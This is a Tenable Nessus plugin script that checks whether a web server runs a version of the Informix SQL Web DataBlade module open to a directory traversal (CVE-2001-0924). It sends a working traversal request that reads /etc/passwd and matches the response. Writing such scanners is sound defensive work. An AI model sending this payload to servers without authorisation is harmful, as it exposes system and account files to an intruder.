#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10805);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2001-0924");
 script_bugtraq_id(3575);
 script_xref(name:"OSVDB", value:"672");
 
 script_name(english:"Informix SQL Web DataBlade Module Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote webserver is hosting an application that is affected by a
directory traversal vulnerability." );
 script_set_attribute(attribute:"description", value:
"The Web DataBlade modules for Informix SQL allows an attacker to read
arbitrary files on the remote system by sending a specially crafted
request using '../' characters." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-11/0193.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Informix SQL Web DataBlade Module 4.13 or later ast this
reportedly fixes the issue." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 summary["english"] = "/ifx/?LO=../../../file";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http.inc");
include("global_settings.inc");
include("misc_func.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
  res = http_send_recv3(method:"GET", item:"/ifx/?LO=../../../../../etc/passwd", port:port);
  if (isnull(res)) exit(1, "The remote web server did not respond.");

  if (egrep(pattern:"root:.*0:[01]:.*", string:res[2])) security_warning(port);
}




